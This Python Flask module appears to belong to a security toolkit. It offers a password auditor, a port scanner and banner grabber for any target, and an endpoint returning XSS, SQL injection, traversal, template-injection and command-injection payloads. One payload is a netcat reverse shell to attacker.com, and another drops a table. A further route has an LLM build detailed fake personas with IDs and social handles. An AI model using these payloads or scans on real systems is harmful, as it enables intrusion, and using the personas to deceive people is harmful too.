"""Simulate category route - password audit, port scan, banner grab, payload generation, legendary creator."""

import json
import socket
import hashlib
from flask import Blueprint, render_template, request, jsonify, Response
from web.auth import login_required

simulate_bp = Blueprint('simulate', __name__, url_prefix='/simulate')


@simulate_bp.route('/')
@login_required
def index():
    from core.menu import MainMenu
    menu = MainMenu()
    menu.load_modules()
    modules = {k: v for k, v in menu.modules.items() if v.category == 'simulate'}
    return render_template('simulate.html', modules=modules)


@simulate_bp.route('/password', methods=['POST'])
@login_required
def password_audit():
    """Audit password strength."""
    data = request.get_json(silent=True) or {}
    password = data.get('password', '')
    if not password:
        return jsonify({'error': 'No password provided'})

    score = 0
    feedback = []

    # Length
    if len(password) >= 16:
        score += 3
        feedback.append('+ Excellent length (16+)')
    elif len(password) >= 12:
        score += 2
        feedback.append('+ Good length (12+)')
    elif len(password) >= 8:
        score += 1
        feedback.append('~ Minimum length (8+)')
    else:
        feedback.append('- Too short (<8)')

    # Character diversity
    has_upper = any(c.isupper() for c in password)
    has_lower = any(c.islower() for c in password)
    has_digit = any(c.isdigit() for c in password)
    has_special = any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in password)

    if has_upper:
        score += 1; feedback.append('+ Contains uppercase')
    else:
        feedback.append('- No uppercase letters')
    if has_lower:
        score += 1; feedback.append('+ Contains lowercase')
    else:
        feedback.append('- No lowercase letters')
    if has_digit:
        score += 1; feedback.append('+ Contains numbers')
    else:
        feedback.append('- No numbers')
    if has_special:
        score += 2; feedback.append('+ Contains special characters')
    else:
        feedback.append('~ No special characters')

    # Common patterns
    common = ['password', '123456', 'qwerty', 'letmein', 'admin', 'welcome', 'monkey', 'dragon']
    if password.lower() in common:
        score = 0
        feedback.append('- Extremely common password!')

    # Sequential
    if any(password[i:i+3].lower() in 'abcdefghijklmnopqrstuvwxyz' for i in range(len(password)-2)):
        score -= 1; feedback.append('~ Contains sequential letters')
    if any(password[i:i+3] in '0123456789' for i in range(len(password)-2)):
        score -= 1; feedback.append('~ Contains sequential numbers')

    # Keyboard patterns
    for pattern in ['qwerty', 'asdf', 'zxcv', '1qaz', '2wsx']:
        if pattern in password.lower():
            score -= 1; feedback.append('~ Contains keyboard pattern')
            break

    score = max(0, min(10, score))
    strength = 'STRONG' if score >= 8 else 'MODERATE' if score >= 5 else 'WEAK'

    hashes = {
        'md5': hashlib.md5(password.encode()).hexdigest(),
        'sha1': hashlib.sha1(password.encode()).hexdigest(),
        'sha256': hashlib.sha256(password.encode()).hexdigest(),
    }

    return jsonify({
        'score': score,
        'strength': strength,
        'feedback': feedback,
        'hashes': hashes,
    })


@simulate_bp.route('/portscan', methods=['POST'])
@login_required
def port_scan():
    """TCP port scan."""
    data = request.get_json(silent=True) or {}
    target = data.get('target', '').strip()
    port_range = data.get('ports', '1-1024').strip()

    if not target:
        return jsonify({'error': 'No target provided'})

    try:
        start_port, end_port = map(int, port_range.split('-'))
    except Exception:
        return jsonify({'error': 'Invalid port range (format: start-end)'})

    # Limit scan range for web UI
    if end_port - start_port > 5000:
        return jsonify({'error': 'Port range too large (max 5000 ports)'})

    try:
        ip = socket.gethostbyname(target)
    except Exception:
        return jsonify({'error': f'Could not resolve {target}'})

    services = {
        21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
        80: 'http', 110: 'pop3', 143: 'imap', 443: 'https', 445: 'smb',
        3306: 'mysql', 3389: 'rdp', 5432: 'postgresql', 8080: 'http-proxy',
    }

    open_ports = []
    total = end_port - start_port + 1

    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append({
                'port': port,
                'service': services.get(port, 'unknown'),
                'status': 'open',
            })
        sock.close()

    return jsonify({
        'target': target,
        'ip': ip,
        'open_ports': open_ports,
        'scanned': total,
    })


@simulate_bp.route('/banner', methods=['POST'])
@login_required
def banner_grab():
    """Grab service banner."""
    data = request.get_json(silent=True) or {}
    target = data.get('target', '').strip()
    port = data.get('port', 80)

    if not target:
        return jsonify({'error': 'No target provided'})

    try:
        port = int(port)
    except Exception:
        return jsonify({'error': 'Invalid port'})

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))

        if port in [80, 443, 8080, 8443]:
            sock.send(b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
        else:
            sock.send(b"\r\n")

        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()

        return jsonify({'banner': banner or 'No banner received'})

    except socket.timeout:
        return jsonify({'error': 'Connection timed out'})
    except ConnectionRefusedError:
        return jsonify({'error': 'Connection refused'})
    except Exception as e:
        return jsonify({'error': str(e)})


@simulate_bp.route('/payloads', methods=['POST'])
@login_required
def generate_payloads():
    """Generate test payloads."""
    data = request.get_json(silent=True) or {}
    payload_type = data.get('type', 'xss').lower()

    payloads_db = {
        'xss': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<body onload=alert(1)>',
            '{{constructor.constructor("alert(1)")()}}',
        ],
        'sqli': [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "1' ORDER BY 1--",
            "1 UNION SELECT null,null,null--",
            "' AND 1=1 --",
            "admin'--",
        ],
        'cmdi': [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(whoami)",
            "; ping -c 3 127.0.0.1",
            "| nc -e /bin/sh attacker.com 4444",
        ],
        'traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00",
        ],
        'ssti': [
            "{{7*7}}",
            "${7*7}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "<%= 7*7 %>",
            "{{request.application.__globals__}}",
        ],
    }

    payloads = payloads_db.get(payload_type)
    if payloads is None:
        return jsonify({'error': f'Unknown payload type: {payload_type}'})

    return jsonify({'type': payload_type, 'payloads': payloads})


# ── Legendary Creator ─────────────────────────────────────────────────────────

_LEGEND_PROMPT = """\
You are generating a completely fictional, synthetic person profile for software testing \
and simulation purposes. Every detail must be internally consistent. Use real city names \
and real school/university names that genuinely exist in those cities. All SSNs, passport \
numbers, and IDs are obviously fake and for testing only.

SEED PARAMETERS (apply these if provided, otherwise invent):
{seeds}

Generate ALL of the following sections in order. Be specific, thorough, and consistent. \
Verify that graduation years match the DOB. Friend ages should be within 5 years of the \
subject. Double-check that named schools exist in the stated cities.

## IDENTITY
Full Legal Name:
Preferred Name / Nickname:
Date of Birth:
Age:
Gender:
Nationality:
Ethnicity:
Fake SSN: [XXX-XX-XXXX]
Fake Passport Number:
Fake Driver's License: [State + alphanumeric]

## PHYSICAL DESCRIPTION
Height:
Weight:
Build: [slim/athletic/average/stocky/heavyset]
Eye Color:
Hair Color & Style:
Distinguishing Features: [birthmarks, scars, tattoos, or "None"]

## CONTACT INFORMATION
Cell Phone: [(XXX) XXX-XXXX]
Work Phone:
Primary Email: [firstname.lastname@domain.com style]
Secondary Email: [personal/fun email]
Home Address: [Number Street, City, State ZIP — use a real city]
City of Residence:

## ONLINE PRESENCE
Primary Username: [one consistent handle used across platforms]
Instagram Handle: @[handle] — [posting style and frequency, e.g. "posts 3x/week, mostly food and travel"]
Twitter/X: @[handle] — [posting style, topics, follower count estimate]
LinkedIn: linkedin.com/in/[handle] — [headline and connection count estimate]
Facebook: [privacy setting + usage description]
Reddit: u/[handle] — [list 3-4 subreddits they frequent with reasons]
Gaming / Other: [platform + gamertag, or "N/A"]

## EDUCATION HISTORY
[Chronological, earliest first. Confirm school names exist in stated cities.]
Elementary School: [Real school name], [City, State] — [Years, e.g. 2001–2007]
Middle School: [Real school name], [City, State] — [Years]
High School: [Real school name], [City, State] — Graduated: [YYYY] — GPA: [X.X] — [1 extracurricular]
Undergraduate: [Real university/college], [City, State] — [Major] — Graduated: [YYYY] — GPA: [X.X] — [2 activities/clubs]
Graduate / Certifications: [if applicable, or "None"]

## EMPLOYMENT HISTORY
[Most recent first. 2–4 positions. Include real or plausible company names.]
Current: [Job Title] at [Company], [City, State] — [Year]–Present
  Role summary: [2 sentences on responsibilities]
Previous 1: [Job Title] at [Company], [City, State] — [Year]–[Year]
  Role summary: [1 sentence]
Previous 2: [if applicable]

## FAMILY
Mother: [Full name], [Age], [Occupation], lives in [City, State]
Father: [Full name], [Age], [Occupation or "Deceased (YYYY)"], lives in [City, State]
Siblings: [Name (age) — brief description each, or "Only child"]
Relationship Status: [Single / In a relationship with [Name] / Married to [Name] since [Year]]
Children: [None, or Name (age) each]

## FRIENDS (5 close friends)
[For each: Full name, age, occupation, city. How they met (be specific: class, job, app, event). \
Relationship dynamic. One memorable shared experience.]
1. [Full Name], [Age], [Occupation], [City] — Met: [specific how/when] — [dynamic] — [shared memory]
2. [Full Name], [Age], [Occupation], [City] — Met: [specific how/when] — [dynamic] — [shared memory]
3. [Full Name], [Age], [Occupation], [City] — Met: [specific how/when] — [dynamic] — [shared memory]
4. [Full Name], [Age], [Occupation], [City] — Met: [specific how/when] — [dynamic] — [shared memory]
5. [Full Name], [Age], [Occupation], [City] — Met: [specific how/when] — [dynamic] — [shared memory]

## HOBBIES & INTERESTS
[7–9 hobbies with specific detail — not just "cooking" but "has been making sourdough for 2 years, \
maintains a starter named 'Gerald', frequents r/sourdough". Include brand preferences, skill level, \
communities involved in.]
1.
2.
3.
4.
5.
6.
7.

## PERSONALITY & PSYCHOLOGY
MBTI Type: [e.g. INFJ] — [brief explanation of how it shows in daily life]
Enneagram: [e.g. Type 2w3]
Key Traits: [5–7 adjectives, both positive and realistic flaws]
Communication Style: [brief description]
Deepest Fear: [specific, personal]
Biggest Ambition: [specific]
Political Leaning: [brief, not extreme]
Spiritual / Religious: [brief]
Quirks: [3 specific behavioral quirks — the more oddly specific the better]

## BACKSTORY NARRATIVE
[250–350 word first-person "About Me" narrative. Write as if this person is introducing themselves \
on a personal website or in a journal. Reference specific people, places, and memories from the \
profile above for consistency. It should feel real, slightly imperfect, and human.]

"""


@simulate_bp.route('/legendary-creator')
@login_required
def legendary_creator():
    return render_template('legendary_creator.html')


@simulate_bp.route('/legendary/generate', methods=['POST'])
@login_required
def legendary_generate():
    """Stream a Legend profile from the LLM via SSE."""
    data = request.get_json(silent=True) or {}

    # Build seed string from user inputs
    seed_parts = []
    for key, label in [
        ('gender', 'Gender'), ('nationality', 'Nationality'), ('ethnicity', 'Ethnicity'),
        ('age', 'Age'), ('profession', 'Profession/Industry'), ('city', 'City/Region'),
        ('education', 'Education Level'), ('interests', 'Interests/Hobbies'),
        ('notes', 'Additional Notes'),
    ]:
        val = data.get(key, '').strip()
        if val:
            seed_parts.append(f"- {label}: {val}")

    seeds = '\n'.join(seed_parts) if seed_parts else '(none — generate freely)'
    prompt = _LEGEND_PROMPT.format(seeds=seeds)

    def generate():
        try:
            from core.llm import get_llm
            llm = get_llm()
            for token in llm.chat(prompt, stream=True):
                yield f"data: {json.dumps({'token': token})}\n\n"
            yield f"data: {json.dumps({'done': True})}\n\n"
        except Exception as exc:
            yield f"data: {json.dumps({'error': str(exc)})}\n\n"

    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
